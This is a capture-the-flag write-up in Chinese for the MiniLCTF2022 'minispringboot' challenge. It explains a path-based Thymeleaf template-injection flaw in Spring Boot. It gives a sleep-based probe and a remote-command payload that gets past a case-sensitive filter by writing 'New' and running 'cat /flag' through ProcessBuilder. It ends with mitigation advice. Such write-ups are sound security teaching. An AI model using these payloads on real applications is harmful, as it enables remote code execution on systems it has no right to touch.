# MiniLCTF2022 minispringboot Writeup

## 题目简述

应用以 Spring Boot 和 Thymeleaf 实现多语言页面，访问 `/first` 后会跳转到 `/en` 或 `/cn`。用户可控路径被拼进 Thymeleaf 视图名，并支持 `__${...}__` 预处理表达式，形成路径型 Thymeleaf SSTI。简单 WAF 过滤了小写 `new` 和 `Runtime`，但没有做规范化。

## 解题过程

先用无副作用的延时表达式确认路径会进入 Spring EL：

```text
/__${T(Thread).sleep(5000)}__::.x
```

请求比正常页面延迟约 5 秒，证明表达式已执行。目标 JDK 8 的 SpEL 关键字解析不区分大小写，WAF 却只匹配小写字符串，因此可用 `New` 绕过，并由 `ProcessBuilder` 直接启动进程：

```text
/__${New java.lang.ProcessBuilder({'bash','-c','cat /flag'}).start()}__::.x
```

`::.x` 用来把前面的表达式嵌入 Thymeleaf 片段/视图名语法。若命令含空格或引号，可先 Base64 编码命令，再让 `bash -c` 解码执行，减少 URL 编码对表达式的干扰。官方复现截图中的回显为：

```text
miniLCTF{thymeleaf_1s_interesting}
```

该截图只有终端文本信息，已转写进正文，没有作为图片保留。

## 方法总结

Thymeleaf 视图名本身也可能成为表达式入口，不能只检查模板正文。黑名单若在解析器之前且大小写规则不同，很容易被等价关键字绕过。修复应让路由只映射到预定义视图名，禁止用户输入进入视图表达式，并升级或配置模板引擎关闭危险的预处理语法；简单过滤 `new`、`Runtime` 不是安全边界。
